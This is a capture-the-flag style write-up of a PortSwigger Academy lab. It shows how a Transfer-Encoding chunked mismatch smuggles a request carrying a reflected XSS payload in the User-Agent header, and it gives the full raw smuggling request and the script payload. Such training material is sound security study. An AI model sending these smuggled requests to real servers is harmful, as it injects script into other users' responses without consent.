#  Exploiting HTTP - request smuggling to deliver reflected XSS

## 📌 Lab Details
- **Title**: Exploiting HTTP request smuggling to deliver reflected XSS
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/c76cecbb6026af05cd93ecc7a616c391e40b73d135e309388f039ecf576fcd53?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-deliver-reflected-xss

## 🔍 Summary
This lab exploited **HTTP request smuggling** to deliver a **reflected XSS payload**. By abusing the mismatch in how the front-end and back-end servers handle `Transfer-Encoding: chunked`, an attacker could smuggle a request that injected a malicious `User-Agent` header. When the victim’s request was processed next, the response reflected the payload and executed `alert(1)`.

## 🛠 Steps to Solve
1. Visit a blog post, and send the request to **Burp Repeater**.
2. Observe that the comment form contains your `User-Agent` header in a hidden input
3. Inject an XSS payload into the User-Agent header and observe that it gets reflected:
   ```sh
   "/><script>alert(1)</script>
   ```
4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 150
   Transfer-Encoding: chunked

   0  

   GET /post?postId=5 HTTP/1.1
   User-Agent: a"/><script>alert(1)</script>
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 5

   x=1
   ```

## 📖 Key Takeaways
- **Chaining vulnerabilities**: Request smuggling can be combined with reflected XSS to affect other users.
- **Front-end vs back-end parsing**: Smuggling works because the two servers disagree on request boundaries.
- **Transfer-Encoding abuse**: Using `chunked` encoding with a `0` chunk enables injecting an extra request.
- **Broader lesson**: Request smuggling isn’t just for hijacking sessions; it can be a **delivery vector for other exploits** like XSS.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ed1cc347-7046-4163-96cc-3c364782717b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e40122f3-63b9-4bc5-b697-ccd8edd1c182" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9cafe814-a994-4772-a3b3-eb7627e2a707" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8467c31a-768a-49ea-88b4-0c1409861579" />
